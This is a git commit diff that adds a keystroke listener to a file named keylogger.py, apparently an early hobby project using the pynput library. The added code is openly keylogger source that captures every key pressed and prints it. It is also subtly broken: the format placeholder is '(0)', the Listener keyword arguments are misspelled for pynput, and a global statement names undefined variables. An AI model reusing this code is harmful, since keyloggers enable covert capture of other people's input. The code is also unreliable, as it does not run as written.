93c5e9b8ccdbede22ba89cfdba2b0a07e28589d6
Aditya Taksande <taksandeaditya@gmail.com>
2019-12-31 12:48:37 +0530

    Upadte keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,8 +1,15 @@
+import pynput
+
 from pynput.keyboard import Key, Listener
 
 def onpress(key):
+    global keys, count
     print("(0) pressed".format(key))
 
 def onrelease(key):
     if key == Key.esc:
         return False
+
+
+with Listener(onpress=onpress, onrelease=onrelease) as listener:
+    listener.join()
